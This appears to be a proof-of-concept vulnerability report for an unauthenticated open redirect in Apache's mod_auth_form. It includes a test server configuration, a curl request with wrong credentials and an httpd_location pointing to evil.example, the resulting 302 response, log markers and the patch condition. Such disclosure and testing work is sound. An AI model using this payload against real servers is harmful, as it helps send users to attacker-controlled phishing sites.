# PoC 080 - Unauthenticated Open Redirect on Failed Form Auth

`authenticate_form_authn()` redirects to the client-supplied `httpd_location`
even when authentication fails, turning every form-auth POST into an
attacker-controlled open redirect.

## Setup

`/etc/apache2/httpd.conf`:

```apache
ServerName localhost
Listen 8080
LoadModule mpm_event_module modules/mod_mpm_event.so
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authn_file_module modules/mod_authn_file.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule authz_user_module modules/mod_authz_user.so
LoadModule auth_form_module modules/mod_auth_form.so
LoadModule session_module modules/mod_session.so
LoadModule session_cookie_module modules/mod_session_cookie.so
LoadModule request_module modules/mod_request.so
LoadModule unixd_module modules/mod_unixd.so

ErrorLog logs/error_log
CustomLog logs/access_log common

DocumentRoot "/srv/www"
<Directory "/srv/www">
    Session On
    SessionCookieName session path=/
    SessionCryptoPassphrase "secretsecretsecret"

    AuthFormProvider file
    AuthUserFile "/etc/apache2/users.htpasswd"
    AuthType form
    AuthName realm
    Require valid-user

    SetHandler form-login-handler
    AuthFormLoginRequiredLocation "/login.html"
</Directory>
```

Create one valid user (the attacker is unauthenticated and supplies wrong
credentials):

```bash
htpasswd -bc /etc/apache2/users.htpasswd alice s3cret
```

## Trigger

```bash
curl -i -X POST http://127.0.0.1:8080/protected \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'httpd_username=attacker&httpd_password=wrong&httpd_location=https://evil.example/landing'
```

## Observed effect

```text
HTTP/1.1 302 Found
Location: https://evil.example/landing
Cache-Control: no-cache
Content-Length: 0
```

The browser follows the redirect to the attacker's host even though
`check_authn()` rejected the credentials. The attacker did not need to know any
password; only the protected URL.

## Log marker

`access_log`:

```text
127.0.0.1 - - "POST /protected HTTP/1.1" 302 -
```

`error_log` (with `LogLevel auth_form:debug`):

```text
[auth_form:debug] check_authn: authentication failed for user 'attacker'
[auth_form:debug] sending Location: https://evil.example/landing  # vulnerable redirect
```

## Notes

- Default field name is `httpd_location` (`AuthFormLocation`).
- Works against any URL inside the `<Directory>` block guarded by
  `AuthType form` because the redirect decision happens before any successful
  authentication.
- Mitigation in the patch: `if (OK == rv && sent_loc)`.
